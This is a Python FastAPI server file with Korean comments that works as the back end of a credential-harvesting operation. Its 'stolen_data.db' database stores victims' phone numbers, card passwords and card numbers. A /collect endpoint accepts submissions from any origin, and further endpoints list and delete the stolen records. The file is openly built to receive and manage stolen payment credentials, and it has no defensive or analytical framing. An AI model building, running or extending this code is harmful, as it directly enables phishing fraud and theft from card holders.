from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, Integer, String, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import datetime
import uvicorn

# --- DB 및 모델 설정 ---
DATABASE_URL = "sqlite:///./stolen_data.db"
Base = declarative_base()

class StolenInfo(Base):
    __tablename__ = "credentials"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String)  # 폰 번호
    password = Column(String) # 카드 비밀번호
    account_number = Column(String, nullable=True) # 카드 번호
    timestamp = Column(DateTime, default=datetime.datetime.now)

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base.metadata.create_all(bind=engine)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class InfoCreate(BaseModel):
    user_id: str
    password: str
    account_number: str = None

# [POST] 데이터 수집
@app.post("/collect")
async def collect_data(info: InfoCreate):
    db = SessionLocal()
    new_data = StolenInfo(
        user_id=info.user_id, 
        password=info.password, 
        account_number=info.account_number
    )
    db.add(new_data)
    db.commit()
    db.close()
    return {"status": "success"}

# [GET] 데이터 조회
@app.get("/logs")
async def get_logs():
    db = SessionLocal()
    logs = db.query(StolenInfo).order_by(StolenInfo.id.desc()).all()
    db.close()
    return logs

# 💡 [새로 추가된 부분] 데이터 삭제 엔드포인트
@app.delete("/logs/{log_id}")
async def delete_log(log_id: int):
    db = SessionLocal()
    # 지우고자 하는 데이터를 ID로 검색
    target_log = db.query(StolenInfo).filter(StolenInfo.id == log_id).first()
    
    if target_log:
        db.delete(target_log)
        db.commit()
    
    db.close()
    return {"status": "success", "message": "삭제 완료"}

if __name__ == "__main__":
    uvicorn.run("server:app", host="0.0.0.0", port=8000, reload=True)